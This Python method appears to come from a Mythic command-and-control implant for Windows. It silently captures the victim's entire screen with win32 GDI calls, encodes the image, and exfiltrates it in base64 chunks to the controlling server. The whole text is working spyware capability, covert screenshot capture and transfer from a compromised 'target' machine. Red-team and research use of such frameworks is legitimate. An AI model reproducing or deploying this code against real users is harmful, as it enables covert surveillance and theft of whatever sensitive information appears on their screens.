def screenshot2(self, task_id):
    import json, base64, io
    from datetime import datetime
    import win32gui, win32ui, win32con, win32api

    # define tamanho da tela
    hdesktop = win32gui.GetDesktopWindow()
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

    # cria DC compatível e bitmap
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)

    # copia pixels da tela para o bitmap
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

    # salva em memória como BMP
    bmpinfo = screenshot.GetInfo()
    bmpstr = screenshot.GetBitmapBits(True)

    # converte para PNG (precisa do Pillow apenas no agente de build, não no alvo)
    try:
        from PIL import Image
        im = Image.frombuffer(
            'RGB',
            (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
            bmpstr, 'raw', 'BGRX', 0, 1
        )
        buf = io.BytesIO()
        im.save(buf, format="PNG")
        sh_data = buf.getvalue()
    except Exception as e:
        # fallback: salva como BMP cru
        sh_data = bmpstr

    # libera objetos GDI
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

    # envia em chunks para o Mythic
    file_size = len(sh_data)
    if file_size > 0:
        total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)
        data = {
            "action": "post_response", 
            "responses": [
                {
                    "task_id": task_id,
                    "total_chunks": total_chunks,
                    "file_path": str(datetime.now()),
                    "chunk_size": CHUNK_SIZE,
                    "is_screenshot": True 
                }
            ]
        }
        initial_response = self.postMessageAndRetrieveResponse(data)

        for i in range(total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."

            if i == total_chunks - 1:
                content = sh_data[i*CHUNK_SIZE:]
            else:
                content = sh_data[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]

            chunk = {
                "action": "post_response", 
                "responses": [
                    {
                        "chunk_num": i+1,
                        "file_id": initial_response["responses"][0]["file_id"],
                        "chunk_data": base64.b64encode(content).decode(),
                        "task_id": task_id                        
                    }
                ]
            }
            self.postMessageAndRetrieveResponse(chunk)

        return json.dumps({ "file_id": initial_response["responses"][0]["file_id"] })
    else:
        return json.dumps({ "error": "Failed to capture screenshot" })
